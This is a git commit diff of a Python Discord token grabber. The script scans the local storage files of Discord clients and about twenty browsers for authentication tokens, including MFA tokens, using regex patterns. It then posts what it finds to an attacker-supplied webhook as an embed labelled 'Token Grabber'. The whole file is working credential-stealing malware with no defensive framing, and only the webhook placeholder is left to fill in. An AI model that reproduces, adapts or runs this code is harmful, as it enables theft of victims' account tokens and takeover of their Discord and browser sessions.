72a5c65005aa0c50d47a6e5730154960de1245e6
Rdimo <80375661+Rdimo@users.noreply.github.com>
2021-10-07 10:05:30 +0200

    Update TokenGrabber.py

--- TokenGrabber.py
+++ TokenGrabber.py
@@ -1,24 +1,46 @@
-import time, random, string, os, re, json
-from urllib.request import Request, urlopen 
+import os, re, requests
 
-Webhook = 'ur webhook here'
+Webhook = 'webhook_here'
 
 def searchtokens(path):
-    path += '\\Local Storage\\leveldb' # using this path to find tokens
-    flacreset = []
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # this is where tokens are located
-            continue
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    flacreset.append(token)
-    return flacreset
+	path += "\\Local Storage\\leveldb"
+	tokens = []
+	for file_name in os.listdir(path):
+		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+			continue
+		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+				for token in re.findall(regex, line):
+					tokens.append(token)
+	return tokens
 
 def main():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
-    paths = {'': roaming + '\\Discord'}
+    paths = {
+    'Discord': roaming + '\\discord',
+    'Discord Canary': roaming + '\\discordcanary',
+    'Lightcord': roaming + '\\Lightcord',
+    'Discord PTB': roaming + '\\discordptb',
+    'Opera': roaming + '\\Opera Software\\Opera Stable',
+    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+    'Amigo': local + '\\Amigo\\User Data',
+    'Torch': local + '\\Torch\\User Data',
+    'Kometa': local + '\\Kometa\\User Data',
+    'Orbitum': local + '\\Orbitum\\User Data',
+    'CentBrowser': local + '\\CentBrowser\\User Data',
+    '7Star': local + '\\7Star\\7Star\\User Data',
+    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+    'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': local + '\\Iridium\\User Data\\Default'
+}
     r = ''
     for GetData, path in paths.items():
         if not os.path.exists(path):
@@ -31,13 +53,18 @@ def main():
         else:
             r += '\n'
         r += '```'
-    Headers = {'Content-Type': 'application/json','User-Agent': 'http://127.0.0.1/rpc:1683'} # im only using this link because it messes up the webhook
-    GetData = json.dumps({'content': r})
-    try:
-        req = Request(Webhook, data=GetData.encode(), headers=Headers)
-        urlopen(req)
-    except:
-        pass
+    statusEmbed = {
+        "embeds": [
+            {
+                "author": {
+                    "name": "Token Grabber",
+                },
+                "description": r,
+                "color": 16119101,
+            }
+        ]
+    }
+    requests.post(Webhook, json=statusEmbed)
 
 if __name__ == '__main__':
     main()
